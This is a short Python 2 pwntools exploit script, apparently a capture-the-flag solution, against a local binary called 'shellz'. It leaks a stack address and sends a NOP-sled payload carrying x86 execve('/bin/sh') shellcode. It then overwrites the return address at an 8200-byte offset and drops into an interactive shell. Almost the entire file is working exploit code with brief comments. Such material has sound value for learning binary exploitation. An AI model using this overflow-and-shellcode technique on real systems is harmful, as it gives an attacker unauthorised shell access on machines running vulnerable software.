#!/usr/bin/env python2

from pwn import *

p = process('./shellz')

p.recvuntil('stack address: ')

buffAddr = int(p.recvline(), 16)

# know approx location of buffAddr
# know that it's 8200 bytes to ret address from cyclic

#calls execve to spawn shell

# call instruction pushes address of next instruction onto the stack
# placing <.string '/bin/sh'> ensures address of string is at
# the top of the stack when we go to 'shellcode:' label.  
# can then pop address of '/bin/sh' into any register we want

shellcode = '''
jmp goToCall

shellcode:
    mov eax, 0x0b
    pop ebx
    xor ecx, ecx
    xor edx, edx
    int 0x80

goToCall:
   call shellcode 
   .string "/bin/sh"
'''

payload = fit ({
    8000: asm(shellcode),
    8200: p32(buffAddr) 
}, filler = '\x90')

p.sendline(payload)

p.interactive()
